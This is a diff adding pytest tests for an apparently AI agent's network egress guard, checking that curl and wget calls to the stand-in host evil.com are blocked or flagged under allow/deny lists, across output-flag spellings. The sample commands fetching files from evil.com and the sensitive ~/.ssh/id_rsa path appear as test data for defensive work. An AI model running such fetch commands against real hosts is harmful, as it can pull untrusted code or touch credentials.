@@ -138,3 +138,112 @@ def test_in_scope_write_is_safe():
 
 def test_sensitive_path_write_is_dangerous():
     assert inspect_path_write("/home/u/.ssh/id_rsa", in_scope=True).level is GuardLevel.DANGEROUS
+
+
+# --- Unified network egress policy (Wave B) --------------------------------
+
+
+def _net(allow=(), deny=()):
+    from jarn.config.schema import NetworkPolicy
+
+    return NetworkPolicy(allow=list(allow), deny=list(deny))
+
+
+def test_classify_host_semantics():
+    from jarn.permissions.guard import NetworkVerdict, classify_host
+
+    # Empty policy = allow-all.
+    assert classify_host("x.com", _net()) is NetworkVerdict.ALLOWED
+    # Non-empty allow restricts.
+    assert classify_host("x.com", _net(allow=["y.com"])) is NetworkVerdict.NOT_ALLOWED
+    assert classify_host("y.com", _net(allow=["y.com"])) is NetworkVerdict.ALLOWED
+    # Glob matches subdomains but not the bare apex.
+    assert classify_host("api.github.com", _net(allow=["*.github.com"])) is NetworkVerdict.ALLOWED
+    assert classify_host("github.com", _net(allow=["*.github.com"])) is NetworkVerdict.NOT_ALLOWED
+    # Deny always wins, even if also on the allowlist.
+    assert classify_host("y.com", _net(allow=["y.com"], deny=["y.com"])) is NetworkVerdict.DENIED
+    # Case-insensitive.
+    assert classify_host("API.GitHub.COM", _net(allow=["*.github.com"])) is NetworkVerdict.ALLOWED
+
+
+def test_curl_denied_host_is_blocked():
+    """An explicit deny → BLOCKED (un-allowlistable), overriding DANGEROUS rules."""
+    v = inspect_command("curl https://evil.com/x", _net(deny=["evil.com"]))
+    assert v.level is GuardLevel.BLOCKED
+    assert "denies egress" in v.reason
+
+
+def test_curl_bare_host_not_allowlisted_is_dangerous():
+    """The task's named case: `curl evil.com` with a policy set is flagged."""
+    v = inspect_command("curl evil.com", _net(allow=["*.github.com"]))
+    assert v.level is GuardLevel.DANGEROUS
+    assert "allowlist" in v.reason
+
+
+def test_curl_allowlisted_host_is_safe():
+    assert inspect_command(
+        "curl https://api.github.com/repos", _net(allow=["*.github.com"])
+    ).level is GuardLevel.SAFE
+
+
+def test_wget_bare_host_flagged():
+    assert inspect_command(
+        "wget evil.com/file", _net(allow=["good.com"])
+    ).level is GuardLevel.DANGEROUS
+
+
+def test_output_flag_filename_not_treated_as_host():
+    """`-o out.txt` is an output file, not an egress target — allowed URL is SAFE."""
+    assert inspect_command(
+        "curl -o out.txt https://example.com/f", _net(allow=["example.com"])
+    ).level is GuardLevel.SAFE
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # Flags that genuinely consume a filename: the URL host still follows.
+        "curl -o saved.txt https://evil.com/file",
+        "curl --output saved.txt https://evil.com/file",
+        "wget -O saved.txt https://evil.com/file",
+        "wget --output-document saved.txt https://evil.com/file",
+        # curl's -O / --remote-name are BOOLEAN — they take NO filename, so the
+        # parser must not skip the following URL (regression: it did, letting the
+        # host escape the deny and be permitted in YOLO mode).
+        "curl -O https://evil.com/file",
+        "curl --remote-name https://evil.com/file",
+    ],
+)
+def test_denied_host_detected_across_all_output_flags(command):
+    """Every curl/wget output-flag spelling must still surface the denied host.
+
+    Option arity is per-program: skipping the next token as a filename only for
+    flags that truly take one keeps the URL visible so the deny fires.
+    """
+    v = inspect_command(command, _net(deny=["evil.com"]))
+    assert v.level is GuardLevel.BLOCKED, command
+    assert "denies egress" in v.reason
+
+
+def test_curl_output_flag_truly_consumes_host_looking_filename():
+    """A real filename-consuming flag still swallows its argument.
+
+    `report.com` is the OUTPUT FILE (deny-listed on purpose); the only egress
+    target is the allowed `example.com`, so the command stays SAFE — proving the
+    filename after `-o` is consumed and never mistaken for a host.
+    """
+    v = inspect_command(
+        "curl -o report.com https://example.com/f", _net(deny=["report.com"])
+    )
+    assert v.level is GuardLevel.SAFE
+
+
+def test_no_policy_leaves_curl_unchanged():
+    """No policy (or an inert one) must not change existing behaviour."""
+    assert inspect_command("curl https://evil.com").level is GuardLevel.SAFE
+    assert inspect_command("curl https://evil.com", _net()).level is GuardLevel.SAFE
+
+
+def test_non_egress_command_ignores_policy():
+    """A command with no curl/wget is untouched by the network policy."""
+    assert inspect_command("ls -la evil.com", _net(deny=["evil.com"])).level is GuardLevel.SAFE
